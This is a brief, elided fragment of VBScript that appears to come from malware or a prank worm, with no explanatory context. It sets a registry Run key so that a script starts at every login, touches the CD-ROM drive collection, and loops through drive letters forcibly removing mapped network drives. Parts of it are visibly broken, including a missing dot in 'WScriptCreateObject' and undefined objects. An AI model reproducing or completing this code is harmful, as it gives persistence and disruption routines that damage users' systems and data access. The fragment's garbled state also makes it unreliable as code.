...
Set fso=WScriptCreateObject("Scripting.FileSystemObject")
...
shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\",ll2,"REG_SZ"
end if	
...
set lpo2=lpo.cdromCollection
 ...
 do
  for input=1 to 26
   drivep.RemoveNetworkDrive a(input),True,True
  next
 loop until input=26
 input=0
